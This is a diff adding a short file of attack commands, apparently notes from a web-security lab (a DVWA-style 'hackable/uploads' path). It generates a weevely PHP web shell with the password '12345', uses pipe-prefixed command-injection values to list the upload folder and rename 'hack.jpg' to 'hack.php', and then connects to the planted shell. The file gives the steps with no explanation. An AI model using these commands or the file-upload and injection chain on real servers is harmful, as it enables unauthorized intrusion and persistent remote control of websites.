@@ -1,0 +1,7 @@
+python File\ Upload/weevely3/weevely.py weevely generate 12345 kill.php
+
+|ls /var/www/html/hackable/uploads
+
+|mv /var/www/html/hackable/uploads/hack.jpg /var/www/html/hackable/uploads/hack.php
+
+python File\ Upload/weevely3/weevely.py http://localhost/hackable/uploads/hack.php 12345
